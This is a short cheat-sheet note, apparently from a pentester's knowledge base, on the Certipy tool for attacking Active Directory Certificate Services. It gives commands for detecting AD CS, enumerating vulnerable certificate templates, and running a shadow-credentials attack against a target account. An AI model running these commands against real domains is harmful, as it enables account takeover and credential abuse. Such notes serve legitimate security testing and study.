---
tags:
  - tool
---
# Certipy

[Certipy](https://github.com/ly4k/Certipy) is an offensive tool for enumerating and abusing Active Directory Certificate Services (AD CS).

```powershell
# Check if adcs is enabled
nxc ldap $IP -u $USER -p '$PASSWD' -M adcs
```

## Enumeration

**Note:** If we receive the error `The NETBIOS connection with the remote host timed out`, we can just try again.

```powershell
# Enuemrate vulnerable certificate templates
certipy find -vulnerable -u $USER@$DOMAIN -p '$PASSWD' -dc-ip $IP -stdout

# Enumerate enabled certificate templates
certipy find -enabled -u $USER@$DOMAIN -p '$PASSWD' -dc-ip $IP -stdout
```

### Exploitation

```powershell
# Shadow cred
certipy shadow auto -u $USER@$DOMAIN -p '$PASSWD' -account $TARGET_USER
certipy shadow auto -k -target $IP -account $TARGET_USER
```
